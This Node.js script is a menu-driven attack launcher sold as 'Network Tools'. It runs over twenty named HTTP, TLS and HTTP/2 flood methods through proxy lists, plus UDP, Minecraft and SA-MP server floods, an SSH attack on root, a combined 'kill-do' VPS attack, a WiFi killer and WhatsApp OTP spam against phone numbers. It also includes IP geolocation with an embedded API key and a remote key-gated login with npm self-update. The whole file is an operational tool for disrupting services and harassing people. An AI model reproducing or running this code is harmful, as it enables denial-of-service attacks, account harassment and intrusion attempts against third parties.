#!/usr/bin/env node

const { exec, spawn } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.1.7'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

// Utility functions
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function banner() {
  console.clear()
  console.log(`
Network Tools v${version}
========================
Type "help" for available commands
`)
}

// Proxy and User Agent management
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching proxy data: ${error.message}`);
  }
}

async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching user agent data: ${error.message}`);
  }
}

function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}

function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}

// Boot up process
async function bootup() {
  try {
    console.log(`Loading... 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`Installing dependencies... 23%`);
    
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/permenmd/cache/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`Checking version... 30%`);
    
    if (version === latestVersion.trim()) {
      console.log(`Version check passed... 60%`);
      
      const secretBangetJir = await fetch('https://github.com/irullkwek/fukong/raw/refs/heads/main/keys');
      const password = await secretBangetJir.text();
      
      permen.question('Enter key: ', async (skibidi) => {
        if (skibidi === password.trim()) {
          console.log(`Login successful`)
          await scrapeProxy()
          console.log(`Loading proxies... 70%`)
          await scrapeUserAgent()
          console.log(`Loading user agents... 100%`)
          await sleep(700)
          console.clear()
          console.log(`Welcome to Network Tools ${version}`)
          await sleep(1000)
          await banner()
          sigma()
        } else {
          console.log(`Invalid key`)
          process.exit(-1);
        }
      }) 
    } else {
      console.log(`Version outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Auto-updating...`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`Installing update`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Please restart the tool`)
      process.exit()
    }
  } catch (error) {
    console.log(`Network connection required`)
  }
}

// WiFi killer function
async function killWifi() {
  const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
  const startKillwiFi = spawn('node', [wifiPath]);
  console.log(`WiFi Killer started. Type 'exit' to stop.`);
  
  permen.question('Command: ', async (yakin) => {
    if (yakin === 'exit') {
      startKillwiFi.kill('SIGKILL')
      console.log(`WiFi Killer stopped`)
      sigma()
    } else {
      console.log(`Invalid command. Use 'exit' to stop.`)
      sigma()
    }
  })
}

// IP tracking function
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Usage: track-ip <ip_address>`);
    console.log(`Example: track-ip 1.1.1.1`);
    sigma();
    return
  }
  
  const [target] = args
  if (target === '0.0.0.0') {
    console.log(`Invalid target IP`)
    sigma()
  } else {
    try {
      const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
      const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
      const res = await fetch(`https://ipwho.is/${target}`);
      const additionalInfo = await res.json();
      const ipInfo = await response.json();

      console.clear()
      console.log(`
IP Tracking Results
==================
Country: ${ipInfo.country_name}
Capital: ${ipInfo.country_capital}
City: ${ipInfo.city}
ISP: ${ipInfo.isp}
Organization: ${ipInfo.organization}
Latitude: ${ipInfo.latitude}
Longitude: ${ipInfo.longitude}

Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
`)
      sigma()
    } catch (error) {
      console.log(`Error tracking ${target}`)
      sigma()
    }
  }
};

// Process management
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}

function ongoingAttack() {
  console.log("\nOngoing Processes:\n");
  processList.forEach((process) => {
    console.log(`Target: ${process.target}
Method: ${process.methods}
Duration: ${process.duration}s
Runtime: ${Math.floor((Date.now() - process.startTime) / 1000)}s\n`);
  });
}

// Attack handler
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Usage: attack <target> <duration> <method>`);
    console.log(`Example: attack https://google.com 120 flood`);
    sigma();
    return
  }
  
  const [target, duration, methods] = args
  try {
    const parsing = new url.URL(target)
    const hostname = parsing.hostname
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
    const result = scrape.data;

    console.clear()
    console.log(`
Attack Configuration
===================
Target: ${target}
Duration: ${duration}s
Method: ${methods}
ISP: ${result.isp}
IP: ${result.query}
AS: ${result.as}

Attack initiated...
`)
  } catch (error) {
    console.log(`Error configuring attack`)
  }
  
  const metode = path.join(__dirname, `/lib/cache/${methods}`);
  
  // Method execution logic
  if (methods === 'flood') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration}`)
    sigma()
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
  } else if (methods === 'h2floodv1') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
  } else if (methods === 'vip') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
  } else if (methods === 'strike') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
    sigma()
  } else if (methods === 'kill') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
  } else if (methods === 'bypass') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
  } else if (methods === 'h2-flood') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
  } else if (methods === 'raw') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration}`)
    sigma()
  } else if (methods === 'thunder') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
  } else if (methods === 'rape') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`)
    sigma()
  } else if (methods === 'storm') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
  } else if (methods === 'destroy') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
  } else if (methods === 'bypass2') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
  } else if (methods === 'hanz') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
  } else if (methods === 'h2-meris') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
  } else if (methods === 'chaptcha') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
  } else if (methods === 'HTTP-C') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
  } else if (methods === 'h2-hold') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
  } else if (methods === 'kill2') {
    pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
  } else if (methods === 'slim') {
    pushOngoing(target, methods, duration)
    const destroy = path.join(__dirname, `/lib/cache/destroy`);
    const storm = path.join(__dirname, `/lib/cache/storm`);
    const rape = path.join(__dirname, `/lib/cache/rape`);
    exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
    exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
    exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
    sigma()
  } else {
    console.log(`Method '${methods}' not recognized.`);
    sigma()
  }
};

// SSH attack
async function killSSH(args) {
  if (args.length < 2) {
    console.log(`Usage: kill-ssh <target> <duration>`);
    console.log(`Example: kill-ssh 123.456.789.10 120`);
    sigma();
    return
  }
  
  const [target, duration] = args
  try {
    const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
    const result = scrape.data;

    console.clear()
    console.log(`
SSH Attack Configuration
=======================
Target: ${target}
Duration: ${duration}s
ISP: ${result.isp}
IP: ${result.query}
AS: ${result.as}

SSH attack initiated...
`)
  } catch (error) {
    console.log(`Configuration error`)
  }

  const metode = path.join(__dirname, `/lib/cache/StarsXSSH`);
  exec(`node ${metode} ${target} 22 root ${duration}`)
  sigma()
};

// OTP attack
async function killOTP(args) {
  if (args.length < 2) {
    console.log(`Usage: kill-otp <target> <duration>`);
    console.log(`Example: kill-otp 628xxx 120`);
    sigma();
    return
  }
  
  const [target, duration] = args
  console.clear()
  console.log(`
OTP Attack Configuration
=======================
Target: ${target}
Duration: ${duration}s

WhatsApp OTP spam initiated...
`)

  const metode = path.join(__dirname, `/lib/cache/StarsXTemp`);
  exec(`node ${metode} +${target} ${duration}`)
  sigma()
};

// Digital Ocean attack
async function killDo(args) {
  if (args.length < 2) {
    console.log(`Usage: kill-do <target> <duration>`);
    console.log(`Example: kill-do 123.456.78.910 300`);
    sigma();
    return
  }
  
  const [target, duration] = args
  console.clear()
  console.log(`
VPS Attack Configuration
=======================
Target: ${target}
Duration: ${duration}s
Method: Multi-vector attack

Attack initiated...
`)

  const raw = path.join(__dirname, `/lib/cache/raw`);
  const flood = path.join(__dirname, `/lib/cache/flood`);
  const ssh = path.join(__dirname, `/lib/cache/StarsXSSH`);
  exec(`node ${ssh} ${target} 22 root ${duration}`)
  exec(`node ${flood} https://${target} ${duration}`)
  exec(`node ${raw} http://${target} ${duration}`)
  sigma()
};

// UDP flood
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Usage: udp-raw <target> <port> <duration>`);
    console.log(`Example: udp-raw 123.456.78.910 53 300`);
    sigma();
    return
  }
  
  const [target, port, duration] = args
  console.clear()
  console.log(`
UDP Attack Configuration
=======================
Target: ${target}
Port: ${port}
Duration: ${duration}s

UDP flood initiated...
`)

  const metode = path.join(__dirname, `/lib/cache/udp`);
  exec(`node ${metode} ${target} ${port} ${duration}`)
  sigma()
};

// Minecraft bot flood
async function mcbot(args) {
  if (args.length < 3) {
    console.log(`Usage: mc-flood <target> <port> <duration>`);
    console.log(`Example: mc-flood 123.456.78.910 25565 300`);
    sigma();
    return
  }
  
  const [target, port, duration] = args
  console.clear()
  console.log(`
Minecraft Attack Configuration
=============================
Target: ${target}
Port: ${port}
Duration: ${duration}s

Minecraft flood initiated...
`)

  const metode = path.join(__dirname, `/lib/cache/StarsXMc`);
  exec(`node ${metode} ${target} ${port} ${duration}`)
  sigma()
};

// SAMP attack
async function samp(args) {
  if (args.length < 3) {
    console.log(`Usage: samp <target> <port> <duration>`);
    console.log(`Example: samp 123.456.78.910 7777 300`);
    sigma();
    return
  }
  
  const [target, port, duration] = args
  console.clear()
  console.log(`
SAMP Attack Configuration
========================
Target: ${target}
Port: ${port}
Duration: ${duration}s

SAMP flood initiated...
`)

  const metode = path.join(__dirname, `/lib/cache/StarsXSamp`);
  exec(`node ${metode} ${target} ${port} ${duration}`)
  sigma()
};

// Subdomain finder
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`Usage: subdo-finder <domain>`);
    console.log(`Example: subdo-finder example.com`);
    sigma();
    return
  }
  
  const [domain] = args
  try {
    let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
    let hasilmanuk = response.data.data.map((data, index) => {
      return `${data}`;
    }).join('\n');
    
    console.clear()
    console.log(`
Subdomain Discovery Results
==========================
Domain: ${domain}

Subdomains found:
${hasilmanuk}
`)
  } catch (error) {
    console.log(`Error discovering subdomains for ${domain}`)
  }
  sigma()
};

// AI Chat
async function chat_ai() {
  permen.question('AI Chat (type "exit" to quit): ', async (yakin) => {
    if (yakin === 'exit') {
      console.log(`AI chat ended`)
      sigma()
    } else {
      try {
        let skidie = await axios.get(`https://api.agatz.xyz/api/ragbot?message=${yakin}`)
        let kiddies = await skidie.data
        console.log(`\nAI Response: ${kiddies.data}\n`)
      } catch (error) {
        console.log(`AI service unavailable`)
      }
      chat_ai()
    }
  })
}

// Main command handler
async function sigma() {
  const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
  const latestNews = await getNews.text();
  
  permen.question('> ', (input) => {
    const [command, ...args] = input.trim().split(/\s+/);

    if (command === 'help') {
      console.log(`
Available Commands:
==================
help           - Show this help menu
methods        - Show available attack methods
track-ip       - Track IP address information
subdo-finder   - Find subdomains of a domain
kill-wifi      - WiFi network disruption
kill-ssh       - SSH service attack
kill-otp       - WhatsApp OTP spam
samp           - SA-MP server attack
mc-flood       - Minecraft server attack
attack         - Launch network attack
udp-raw        - UDP flood attack
kill-do        - VPS/server attack
ongoing        - Show active processes
news           - Show latest news
ai             - Chat with AI
clear          - Clear terminal
`);
      sigma();
    } else if (command === 'methods') {
      console.log(`
Available Attack Methods:
========================
flood      - HTTP(s) flood
h2floodv1  - HTTP/2 flood v1
h2-flood   - HTTP/2 flood
HTTP-C     - HTTP continuous
tls        - TLS 1.3 attack
strike     - Strike method
kill       - Kill method
raw        - Raw flood
bypass     - Bypass protection
thunder    - Thunder method
storm      - Storm method
rape       - Rape method
destroy    - Destroy method
slim       - Slim method
bypass2    - Bypass v2
hanz       - Hanz method
kill2      - Kill v2
h2-hold    - HTTP/2 hold
h2-meris   - HTTP/2 meris
chaptcha   - Captcha bypass
`);
      sigma();
    } else if (command === 'news') {
      console.log(`\nLatest News:\n${latestNews}`);
      sigma();
    } else if (command === 'attack') {
      handleAttackCommand(args);
    } else if (command === 'kill-ssh') {
      killSSH(args);
    } else if (command === 'kill-otp') {
      killOTP(args);
    } else if (command === 'udp-raw') {
      udp_flood(args);
    } else if (command === 'kill-do') {
      killDo(args);
    } else if (command === 'ongoing') {
      ongoingAttack()
      sigma()
    } else if (command === 'track-ip') {
      trackIP(args);
    } else if (command === 'ai') {
      console.log(`AI Chat started. Type "exit" to stop.`);
      chat_ai()
    } else if (command === 'mc-flood') {
      mcbot(args)
    } else if (command === 'samp') {
      samp(args)
    } else if (command === 'subdo-finder') {
      subdomen(args)
    } else if (command === 'kill-wifi') {
      killWifi()
    } else if (command === 'clear') {
      banner()
      sigma()
    } else {
      console.log(`Command '${command}' not found. Type 'help' for available commands.`);
      sigma();
    }
  });
}

// Cleanup functions
function clearall() {
  clearProxy()
  clearUserAgent()
}

// Process handlers
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
  clearall()
  process.exit();
});

// Start the application
bootup()